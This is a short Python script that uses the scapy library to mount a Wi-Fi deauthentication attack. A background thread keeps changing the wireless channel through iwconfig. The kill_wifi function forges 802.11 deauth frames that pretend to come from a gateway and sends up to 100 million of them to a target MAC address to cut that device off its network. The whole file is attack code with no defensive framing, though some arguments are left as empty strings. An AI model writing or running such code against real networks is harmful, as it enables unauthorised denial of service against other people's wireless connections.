from scapy.all import *


def change_channel(netowrk_interface):
    i = 1
    while 1:
        time.sleep(3)
        os.system(f"iwconfig {netowrk_interface} channel {i}")
        i = (i+1)%13+1

def kill_wifi(target_mac,gateway_mac):
# target_mac = "b4:b5:b6:f2:4d:17"
# gateway_mac = "54:ec:2f:39:1d:d8"
# 802.11 frame
# addr1: destination MAC
# addr2: source MAC
# addr3: Access Point MAC
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    # stack them up
    pkt = RadioTap()/dot11/Dot11Deauth()
    # send the packet
    sendp(pkt, count=100000000, iface="", verbose=3)

x = Thread(target=change_channel, args=('',))
x.start()
kill_wifi("b4:b5:b6:f2:4d:17","")
x.join()